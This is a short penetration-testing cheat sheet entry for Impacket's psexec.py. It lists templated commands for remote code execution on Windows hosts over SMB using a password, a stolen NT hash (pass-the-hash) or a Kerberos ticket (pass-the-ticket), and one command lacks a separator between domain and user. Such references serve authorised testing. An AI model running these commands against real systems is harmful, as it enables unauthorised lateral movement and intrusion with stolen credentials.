# psexec (imp)

%  windows, impacket-exec, RemComSvc
#plateform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/CONNECT  

## desc
```
PSEXEC like functionality example using RemComSvc
```

## execute (creds)
create a new service (using \pipe\svcctl via SMB)
```bash
psexec.py <domain_fqdn>/<user>:'<password>'@<target_fqdn>
```

## execute (pth)
create a new service (using \pipe\svcctl via SMB)
```bash
psexec.py -hashes :<nt_hash> <domain_fqdn><user>@<target_fqdn>
```

## execute (ptt)
create a new service (using \pipe\svcctl via SMB)
```bash
KRB5CCNAME=<ccache> psexec.py -no-pass -k <target_fqdn>
```

